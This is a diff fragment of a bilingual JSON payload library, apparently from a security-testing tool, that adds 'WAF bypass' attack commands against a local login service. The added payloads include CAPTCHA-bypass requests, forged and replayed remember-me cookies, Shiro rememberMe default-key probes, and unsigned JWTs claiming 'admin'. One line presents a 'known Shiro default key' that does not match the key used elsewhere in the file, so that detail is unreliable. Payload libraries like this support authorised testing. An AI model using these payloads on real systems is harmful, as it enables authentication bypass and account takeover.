+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "空值类型变换",
+                "en": "Null-Type Variants"
+              },
+              "command": "curl -sS --max-time 5 -H \"Content-Type: application/json\" -d '{\"username\":\"payloader\",\"password\":\"PAYLOADER_WRONG\",\"captcha\":{}}' http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "空对象形态绕过 falsy 空值检查。成功判据：对象形态通过或跳过校验。",
+                "en": "Empty-object forms bypass falsy empty checks. Success: object form passes or skips validation."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "\"captcha\":{}",
+                  "explanation": {
+                    "zh": "空对象形态",
+                    "en": "Empty object shape"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "-H \"Content-Type: application/json\"",
+                  "explanation": {
+                    "zh": "JSON 请求体类型",
+                    "en": "JSON body content type"
+                  },
+                  "type": "header"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "NUL 与嵌套对象",
+                "en": "NUL & Nested Object"
+              },
+              "command": "curl -sS --max-time 5 -d \"captcha=%00&captcha[value]=x&captcha[required]=false\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "NUL 字节与对象化参数关闭必填标志。成功判据：required=false 被采信。",
+                "en": "NUL bytes and object-shaped parameters disable the required flag. Success: required=false is honored."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "captcha=%00",
+                  "explanation": {
+                    "zh": "NUL 字节",
+                    "en": "NUL byte"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "captcha[value]=x",
+                  "explanation": {
+                    "zh": "对象化参数",
+                    "en": "Object-typed param"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "captcha[required]=false",
+                  "explanation": {
+                    "zh": "关闭必填标志",
+                    "en": "Disables required flag"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "CAPTCHA 输入 Schema样例 1",
+                "en": "CAPTCHA Input Schema Sample 1"
+              },
+              "command": "username=payloader&password=PAYLOADER_WRONG&captcha=\n{\"username\":\"payloader\",\"password\":\"PAYLOADER_WRONG\",\"captcha\":null}\nusername=payloader&password=PAYLOADER_WRONG\ncaptcha=0\ncaptcha=undefined\ncaptcha[]=\ncaptcha=true\ncaptcha=%00\ncaptcha=%20\n# Expected: each malformed value fails under the same server-side challenge state.",
+              "description": {
+                "zh": "在隔离环境使用合成主体执行该CAPTCHA 输入 Schema样例，并以服务端日志和只读标记确认结果。",
+                "en": "Run this CAPTCHA Input Schema sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "username=payloader&password=PAYLOADER_WRONG&captcha=",
+                  "explanation": {
+                    "zh": "固定错误口令基线",
+                    "en": "Wrong-password base"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "captcha=0",
+                  "explanation": {
+                    "zh": "数字零",
+                    "en": "Numeric zero"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "captcha=%00",
+                  "explanation": {
+                    "zh": "NUL 字节",
+                    "en": "NUL byte"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "captcha=%20",
+                  "explanation": {
+                    "zh": "空格编码",
+                    "en": "Encoded space"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "captcha=true",
+                  "explanation": {
+                    "zh": "布尔真值",
+                    "en": "Boolean true"
+                  },
+                  "type": "value"
+                }
+              ],
+              "platform": "all",
+              "requiresAdmin": false
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -2410,10 +5792,7 @@
                 "zh": "只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。",
                 "en": "Run only the first sample in this validation card while keeping the account, session, and target object unchanged."
               },
-              "payloadRef": {
-                "area": "execution",
-                "index": 0
-              }
+              "payload": "captcha=PAYLOADER_TEST_CAPTCHA\ncaptcha=\ncaptcha=null\ncaptcha=undefined\ncaptcha[]=\n# Replay and malformed values are separate controls and must all be verified in server challenge logs."
             },
             {
               "title": {
@@ -2524,8 +5903,8 @@
         {
           "id": "auth-captcha-route-consistency",
           "name": {
-            "zh": "CAPTCHA 路由策略一致性",
-            "en": "CAPTCHA Route Policy Consistency"
+            "zh": "CAPTCHA 路由覆盖绕过",
+            "en": "CAPTCHA Coverage Gap Bypass"
           },
           "description": {
             "zh": "对比有无 CAPTCHA 的等价路由，验证验证码策略覆盖是否一致。",
@@ -2557,7 +5936,95 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "版本路径变形",
+                "en": "Versioned Path Variant"
+              },
+              "command": "curl -sS --max-time 5 -o /dev/null -w \"%{http_code}\\n\" -d \"username=payloader&password=PAYLOADER_WRONG\" http://127.0.0.1:8080/api/v1/login",
+              "description": {
+                "zh": "绕过路由级验证码策略映射：版本化路径落到未配置验证码的处理链。成功判据：无验证码参数仍进入认证流程。",
+                "en": "Bypasses route-level captcha policy mapping since versioned paths land on an unconfigured handler chain. Success: authentication proceeds without captcha parameters."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "http://127.0.0.1:8080/api/v1/login",
+                  "explanation": {
+                    "zh": "版本化登录路径",
+                    "en": "Versioned login path"
+                  },
+                  "type": "url"
+                },
+                {
+                  "part": "-o /dev/null -w \"%{http_code}\\n\"",
+                  "explanation": {
+                    "zh": "仅输出状态码",
+                    "en": "Status code only"
+                  },
+                  "type": "flag"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "Accept 与方法组合",
+                "en": "Accept & Method Combo"
+              },
+              "command": "curl -sS --max-time 5 -X POST -H \"Accept: application/json\" -o /dev/null -w \"%{http_code}\\n\" -d \"username=payloader&password=PAYLOADER_WRONG\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "JSON 协商路径与 POST 组合绕过 HTML 表单策略。成功判据：返回认证错误而非验证码挑战。",
+                "en": "JSON content negotiation plus POST bypasses the HTML form policy. Success: an auth error returns instead of a captcha challenge."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-X POST",
+                  "explanation": {
+                    "zh": "POST 方法",
+                    "en": "POST method"
+                  },
+                  "type": "flag"
+                },
+                {
+                  "part": "-H \"Accept: application/json\"",
+                  "explanation": {
+                    "zh": "JSON 协商头",
+                    "en": "JSON negotiation header"
+                  },
+                  "type": "header"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "方法覆盖头变形",
+                "en": "Method Override Header Variant"
+              },
+              "command": "curl -sS --max-time 5 -H \"X-HTTP-Method-Override: POST\" -o /dev/null -w \"%{http_code}\\n\" -d \"username=payloader&password=PAYLOADER_WRONG\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "覆盖头触发另一条路由处理链绕过策略。成功判据：未触发验证码挑战。",
+                "en": "Override headers route to a different handler chain that skips the policy. Success: no captcha challenge triggers."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-H \"X-HTTP-Method-Override: POST\"",
+                  "explanation": {
+                    "zh": "方法覆盖头",
+                    "en": "Method override header"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "-d \"username=payloader&password=PAYLOADER_WRONG\"",
+                  "explanation": {
+                    "zh": "无验证码提交",
+                    "en": "Submit without captcha"
+                  },
+                  "type": "payload"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -2686,7 +6153,127 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "签名截断伪造检测",
+                "en": "Signature Truncation Forgery Probe"
+              },
+              "command": "printf \"%s\" \"payloader:2999999999:PAYLOADER_MARKER:TRUNCATED_SIG\" | base64 -w0 | curl -sS --max-time 5 -b \"remember=@-\" http://127.0.0.1:8080/",
+              "description": {
+                "zh": "绕过截断比较或未校验实现：篡改过期时间戳并保留畸形签名。成功判据：令牌仍被接受为有效登录。",
+                "en": "Bypasses truncated-comparison or missing verification by tampering the timestamp with a malformed signature. Success: token still accepted as a valid login."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "printf \"%s\" \"payloader:2999999999:PAYLOADER_MARKER:TRUNCATED_SIG\"",
+                  "explanation": {
+                    "zh": "篡改过期时间戳",
+                    "en": "Tampered expiry"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "TRUNCATED_SIG",
+                  "explanation": {
+                    "zh": "畸形签名段",
+                    "en": "Malformed signature"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "base64 -w0",
+                  "explanation": {
+                    "zh": "base64 编码",
+                    "en": "Base64 encodes"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "-b \"remember=@-\"",
+                  "explanation": {
+                    "zh": "令牌写入 Cookie",
+                    "en": "Token as cookie value"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "base64url 字母表变形",
+                "en": "base64url Alphabet Variant"
+              },
+              "command": "printf \"%s\" \"payloader:2999999999:PAYLOADER_MARKER\" | base64 -w0 | tr '+/' '-_' | tr -d '=' | curl -sS --max-time 5 -b \"remember=@-\" http://127.0.0.1:8080/",
+              "description": {
+                "zh": "换 URL 安全字母表绕过字符集严格校验。成功判据：变形令牌通过完整性检查。",
+                "en": "Switches to the URL-safe alphabet to bypass strict charset validation. Success: mutated token passes integrity checks."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "tr '+/' '-_'",
+                  "explanation": {
+                    "zh": "换 URL 安全字母",
+                    "en": "Switches to URL-safe alphabet"
+                  },
+                  "type": "operator"
+                },
+                {
+                  "part": "tr -d '='",
+                  "explanation": {
+                    "zh": "去填充等号",
+                    "en": "Strips padding"
+                  },
+                  "type": "operator"
+                },
+                {
+                  "part": "payloader:2999999999:PAYLOADER_MARKER",
+                  "explanation": {
+                    "zh": "改写载荷",
+                    "en": "Tampered payload"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "分隔符注入错位",
+                "en": "Separator Injection Misalignment"
+              },
+              "command": "printf \"%s\" \"payloader:1999999999:PAYLOADER:MARKER_EXTRA\" | base64 -w0 | curl -sS --max-time 5 -b \"remember=@-\" http://127.0.0.1:8080/",
+              "description": {
+                "zh": "额外冒号破坏解析对齐，检验拆分与校验是否分离。成功判据：错位令牌仍认证成功。",
+                "en": "An extra colon misaligns parsing to test whether splitting and validation are separate. Success: misaligned token still authenticates."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "payloader:1999999999:PAYLOADER:MARKER_EXTRA",
+                  "explanation": {
+                    "zh": "错位令牌",
+                    "en": "Misaligned token"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "PAYLOADER:MARKER_EXTRA",
+                  "explanation": {
+                    "zh": "额外冒号段",
+                    "en": "Extra colon segment"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "base64 -w0",
+                  "explanation": {
+                    "zh": "base64 编码",
+                    "en": "Base64 encodes"
+                  },
+                  "type": "function"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -2770,7 +6357,119 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "并发多 Token 复用",
+                "en": "Parallel Multi-Token Reuse"
+              },
+              "command": "for i in 1 2 3; do curl -sS --max-time 5 -c \"remember-${i}.cookies\" -d \"username=payloader&password=PAYLOADER_TEST&remember=1\" http://127.0.0.1:8080/login; done; grep -h remember remember-*.cookies | cut -f7 | sort | uniq -c",
+              "description": {
+                "zh": "多会话生成 remember 令牌后统计复用窗口。成功判据：轮换后旧令牌计数不为零（撤销失败）。",
+                "en": "Generates remember tokens across sessions then counts reuse after rotation. Success: old tokens still count after rotation (revocation failure)."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "grep -h remember remember-*.cookies",
+                  "explanation": {
+                    "zh": "提取 remember 值",
+                    "en": "Extracts remember values"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "cut -f7",
+                  "explanation": {
+                    "zh": "取 Cookie 值列",
+                    "en": "Takes the value column"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "sort | uniq -c",
+                  "explanation": {
+                    "zh": "统计重复计数",
+                    "en": "Counts duplicates"
+                  },
+                  "type": "operator"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "改密后旧令牌重放",
+                "en": "Post-Rotation Old-Token Replay"
+              },
+              "command": "curl -sS --max-time 5 -b \"remember=OLD_REMEMBER_TOKEN\" http://127.0.0.1:8080/account -o /dev/null -w \"%{http_code}\\n\"; curl -sS --max-time 5 -X POST -d \"old=PAYLOADER_TEST&new=PAYLOADER_ROTATED\" -b \"session=VALID_SESSION\" http://127.0.0.1:8080/account/password; curl -sS --max-time 5 -b \"remember=OLD_REMEMBER_TOKEN\" http://127.0.0.1:8080/account -o /dev/null -w \"%{http_code}\\n\"",
+              "description": {
+                "zh": "改密后重放旧持久令牌检验撤销联动。成功判据：第二次请求仍返回 200。",
+                "en": "Replays the old persistent token after a password change to test revocation coupling. Success: the second request still returns 200."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-b \"remember=OLD_REMEMBER_TOKEN\"",
+                  "explanation": {
+                    "zh": "旧持久令牌",
+                    "en": "Old persistent token"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "-d \"old=PAYLOADER_TEST&new=PAYLOADER_ROTATED\"",
+                  "explanation": {
+                    "zh": "改密参数",
+                    "en": "Password change params"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "-o /dev/null -w \"%{http_code}\\n\"",
+                  "explanation": {
+                    "zh": "仅输出状态码",
+                    "en": "Status code only"
+                  },
+                  "type": "flag"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "编码令牌重放",
+                "en": "Encoded-Token Replay"
+              },
+              "command": "printf \"%s\" \"OLD_REMEMBER_TOKEN\" | base64 -w0 | xargs -I{} curl -sS --max-time 5 -b \"remember={}\" http://127.0.0.1:8080/account -o /dev/null -w \"%{http_code}\\n\"",
+              "description": {
+                "zh": "编码形态绕过撤销黑名单精确匹配。成功判据：编码后旧令牌仍有效。",
+                "en": "Encoded form bypasses exact-match revocation blacklists. Success: the encoded old token still works."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "printf \"%s\" \"OLD_REMEMBER_TOKEN\" | base64 -w0",
+                  "explanation": {
+                    "zh": "编码旧令牌",
+                    "en": "Encodes the old token"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "xargs -I{}",
+                  "explanation": {
+                    "zh": "代入参数执行",
+                    "en": "Substitutes and runs"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "-b \"remember={}\"",
+                  "explanation": {
+                    "zh": "编码令牌 Cookie",
+                    "en": "Encoded token cookie"
+                  },
+                  "type": "payload"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -2821,8 +6520,8 @@
         {
           "id": "auth-shiro-rememberme-deserialization",
           "name": {
-            "zh": "Shiro RememberMe 反序列化边界",
-            "en": "Shiro RememberMe Deserialization Boundary"
+            "zh": "Shiro RememberMe 反序列化",
+            "en": "Shiro RememberMe Deserialization"
           },
           "description": {
             "zh": "用已知默认密钥构造加密的 Shiro RememberMe 值，验证反序列化边界（限授权实验环境）。",
@@ -2854,7 +6553,111 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "deleteMe 编码探测",
+                "en": "Encoded deleteMe Probe"
+              },
+              "command": "curl -sS --max-time 5 -b \"rememberMe=%64eleteMe\" -o /dev/null -w \"%{http_code} %{size_download}\\n\" http://127.0.0.1:8080/marker",
+              "description": {
+                "zh": "绕过对明文 deleteMe 的 WAF 识别：编码形式仍触发 Shiro 异常路径确认指纹。成功判据：响应出现 Set-Cookie: rememberMe=deleteMe。",
+                "en": "Bypasses WAFs flagging plaintext deleteMe while still triggering the Shiro exception path for fingerprinting. Success: response sets rememberMe=deleteMe."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "rememberMe=%64eleteMe",
+                  "explanation": {
+                    "zh": "编码 deleteMe",
+                    "en": "Encoded deleteMe"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "-w \"%{http_code} %{size_download}\\n\"",
+                  "explanation": {
+                    "zh": "输出码与大小",
+                    "en": "Code and size output"
+                  },
+                  "type": "flag"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "双 Cookie 头叠加",
+                "en": "Duplicate Cookie Stacking"
+              },
+              "command": "printf 'GET /marker HTTP/1.1\\r\\nHost: 127.0.0.1:8080\\r\\nCookie: rememberMe=PAYLOADER_INVALID\\r\\nCookie: rememberMe=kPH+bIxk5D2deZiIxcaaaA==\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 8080",
+              "description": {
+                "zh": "利用重复 Cookie 头取值差异绕过单值检查。成功判据：第二个 rememberMe 触发解密错误栈。",
+                "en": "Exploits duplicate-cookie extraction divergence to slip a second rememberMe value past single-value checks. Success: the second value triggers a decryption error stack."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "Cookie: rememberMe=PAYLOADER_INVALID",
+                  "explanation": {
+                    "zh": "首个 Cookie 头",
+                    "en": "First cookie header"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "Cookie: rememberMe=kPH+bIxk5D2deZiIxcaaaA==",
+                  "explanation": {
+                    "zh": "历史默认密钥值",
+                    "en": "Historical default key"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "| nc 127.0.0.1 8080",
+                  "explanation": {
+                    "zh": "nc 直连发送",
+                    "en": "Sends raw bytes via nc"
+                  },
+                  "type": "operator"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "分段值拼接",
+                "en": "Chunked Value Concatenation"
+              },
+              "command": "curl -sS --max-time 5 -b \"rememberMe=PAYLOADER_IN\" -b \"rememberMe=VALID_PART\" -o /dev/null -w \"%{http_code}\\n\" http://127.0.0.1:8080/marker",
+              "description": {
+                "zh": "多段值经容器拼接后还原完整密文，绕过长度与特征检查。成功判据：拼接值触发反序列化处理路径。",
+                "en": "Multiple values concatenated by the container rebuild the ciphertext, bypassing length and signature checks. Success: concatenated value reaches the deserialization path."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-b \"rememberMe=PAYLOADER_IN\"",
+                  "explanation": {
+                    "zh": "首段密文",
+                    "en": "First ciphertext part"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "-b \"rememberMe=VALID_PART\"",
+                  "explanation": {
+                    "zh": "次段密文",
+                    "en": "Second ciphertext part"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/marker",
+                  "explanation": {
+                    "zh": "标记端点",
+                    "en": "Marker endpoint"
+                  },
+                  "type": "url"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -2875,10 +6678,7 @@
                 "zh": "只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。",
                 "en": "Run only the first sample in this validation card while keeping the account, session, and target object unchanged."
               },
-              "payloadRef": {
-                "area": "execution",
-                "index": 0
-              }
+              "payload": "curl -sS --max-time 5 -b \"rememberMe=PAYLOADER_INVALID\" http://127.0.0.1:8080/marker\ncurl -sS --max-time 5 -b \"rememberme=PAYLOADER_INVALID\" http://127.0.0.1:8080/marker\ncurl -sS --max-time 5 -b \"REMEMBERME=PAYLOADER_INVALID\" http://127.0.0.1:8080/marker\n# Cookie names are case-sensitive; only the configured exact name should be processed, and all invalid values must fail.\nprintf \"%s\\n\" \"historical_key_lists=offline-version-scoped process_execution=disabled\"\nrememberMe=kPH+bIxk5D2deZiIxcahnHgqnzGDCLToh0T3j5BJOmKBOZvt1VaD2rqDkYWDdF7g4CQ5F8Zr3mVMSXcOgoKcwC4mIkCtJ5YT5lpF1ej0=\n# 已知 Shiro 默认密钥 kPH+bIxk5D2deZiIxcahnHgqnzGDCLToh0T3j5BJOmKBOZvt1VaD2rqDkYWDdF7g4CQ5F8Zr3mVMSXcOgoKcwC4mIkCtJ5YT5lpF1ej0= 加密的 RememberMe（解码失败/rememberMe 删除即默认密钥在用）"
             },
             {
               "title": {
@@ -3319,7 +7119,135 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "嵌套令牌双重解码",
+                "en": "Nested Token Double Decode"
+              },
+              "command": "python3 - <<'PY'\nimport base64, json\ninner = base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').decode().rstrip('=') + \".\" + base64.urlsafe_b64encode(b'{\"sub\":\"admin\"}').decode().rstrip('=') + \".\"\nouter_payload = {\"token\": inner}\np = base64.urlsafe_b64encode(json.dumps(outer_payload, separators=(',',':')).encode()).decode().rstrip('=')\nh = base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').decode().rstrip('=')\nprint(f\"{h}.{p}.\")\nPY",
+              "description": {
+                "zh": "外层载体携带内层 JWT，探测双重解码信任。成功判据：内层 claims 被采信。",
+                "en": "Outer carrier wraps an inner JWT to probe double-decode trust. Success: inner claims are honored."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "python3 - <<'PY'",
+                  "explanation": {
+                    "zh": "heredoc 执行脚本",
+                    "en": "Runs an inline Python heredoc"
+                  },
+                  "type": "control"
+                },
+                {
+                  "part": "b'{\"alg\":\"none\",\"typ\":\"JWT\"}'",
+                  "explanation": {
+                    "zh": "内层 none 头",
+                    "en": "Inner none header"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "outer_payload = {\"token\": inner}",
+                  "explanation": {
+                    "zh": "外层携带内层",
+                    "en": "Outer carries the inner"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "print(f\"{h}.{p}.\")",
+                  "explanation": {
+                    "zh": "输出嵌套令牌",
+                    "en": "Prints the nested token"
+                  },
+                  "type": "function"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "claim 类型混淆",
+                "en": "Claim Type Confusion"
+              },
+              "command": "python3 - <<'PY'\nimport base64, json\nclaims = {\"sub\":\"admin\",\"exp\":\"9999999999\",\"aud\":[\"payloader-api\",\"admin-api\"],\"iss\":1}\np = base64.urlsafe_b64encode(json.dumps(claims, separators=(',',':')).encode()).decode().rstrip('=')\nh = base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').decode().rstrip('=')\nprint(f\"{h}.{p}.\")\nPY",
+              "description": {
+                "zh": "exp 用字符串、aud 用数组、iss 用数字，绕过严格类型比较。成功判据：类型异常令牌通过校验。",
+                "en": "String exp, array aud, and numeric iss bypass strict type comparisons. Success: the mistyped token validates."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "python3 - <<'PY'",
+                  "explanation": {
+                    "zh": "heredoc 执行脚本",
+                    "en": "Runs an inline Python heredoc"
+                  },
+                  "type": "control"
+                },
+                {
+                  "part": "\"exp\":\"9999999999\"",
+                  "explanation": {
+                    "zh": "字符串 exp",
+                    "en": "String-typed exp"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "\"aud\":[\"payloader-api\",\"admin-api\"]",
+                  "explanation": {
+                    "zh": "数组 aud",
+                    "en": "Array-typed aud"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "\"iss\":1",
+                  "explanation": {
+                    "zh": "数字 iss",
+                    "en": "Numeric iss"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "重复 claim 键覆盖",
+                "en": "Duplicate Claim Override"
+              },
+              "command": "python3 - <<'PY'\nimport base64\nraw = '{\"sub\":\"user\",\"sub\":\"admin\",\"role\":\"user\",\"role\":\"admin\"}'\np = base64.urlsafe_b64encode(raw.encode()).decode().rstrip('=')\nh = base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').decode().rstrip('=')\nprint(f\"{h}.{p}.\")\nPY",
+              "description": {
+                "zh": "JSON 重复键在解析层与校验层取值不同导致提权。成功判据：admin 值被采信。",
+                "en": "Duplicate JSON keys resolve differently across parsing and validation layers, escalating privileges. Success: the admin value is honored."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "python3 - <<'PY'",
+                  "explanation": {
+                    "zh": "heredoc 执行脚本",
+                    "en": "Runs an inline Python heredoc"
+                  },
+                  "type": "control"
+                },
+                {
+                  "part": "{\"sub\":\"user\",\"sub\":\"admin\",\"role\":\"user\",\"role\":\"admin\"}",
+                  "explanation": {
+                    "zh": "重复键声明",
+                    "en": "Duplicate-key claims"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "raw = ",
+                  "explanation": {
+                    "zh": "原始 JSON 变量",
+                    "en": "Raw JSON variable"
+                  },
+                  "type": "control"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
